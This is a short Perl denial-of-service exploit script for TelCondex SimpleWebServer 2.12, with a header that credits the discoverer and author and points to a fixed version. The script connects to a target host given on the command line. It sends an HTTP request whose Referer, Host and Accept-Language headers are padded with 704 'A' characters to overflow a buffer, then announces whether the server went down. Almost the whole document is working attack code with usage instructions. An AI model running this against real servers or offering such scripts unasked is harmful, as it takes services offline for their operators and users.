#!/usr/local/bin/perl
#                     TelCondex WebServer: Buffer overflow
#                     ------------------------------------
#
# Vendor:     TelCondex SimpleWebserver(tc.SimpleWebServer)
# Version:    2.12.30210 Build 3285
# Discoverer: Oliver Karow<oliver.karow@gmx.de>
# Exploit:    DoS(Denial Of Service) By Blade<blade@abez.org>
# Solution:   Download Fixed 
Version<http://www.telcondex.de/pub/sws_default.htm>
#                  <FiH eZine 2003 - http://www.fihezine.tsx.to>
####################################################################################
        use IO::Socket;

 print '
 TelCondex Webserver DoS Exploit - 
http://securityfocus.com/archive/1/342785
 Programmer: Blade<blade@abez.org> - Discoverer: 
Oliver.K.<oliver.karow@gmx.de>
          FiH eZiNe 2002<>2003 - http://www.fihezine.tsx.to\n
                    Usage: TelCondex.pl <HostVulnerable> [Port]
 ';

        $server = $ARGV[0];
        if ($ARGV[1] == 0){ $port=80; } else { $port=$ARGV[1]; }

        print" Connecting...";
        $Sock=IO::Socket::INET->new(Proto=>"tcp", 
PeerAddr=>$server,PeerPort=>$port, Timeout=>5);
        if ($Sock){
        print" Conected...";
        $Sock->autoflush(1);

        print $Sock "GET / HTTP/1.1\r\n".
                     "Accept: */* \r\n".
                     "Referer: ". ("A" x 704) ."\r\n".
                     "Host: ". ("A" x 704) ."\r\n".
                     "Accept-Language: ". ("A" x 704) ."\r\n\r\n";
        @Respost=<$Sock>;
        close($Sock);
        if (@Respost == 0){die " D.o.S Completed!\n";} else { print " D.o.S 
Not Completed"; }
        }else{ print"Impossible to connect from $server"; }
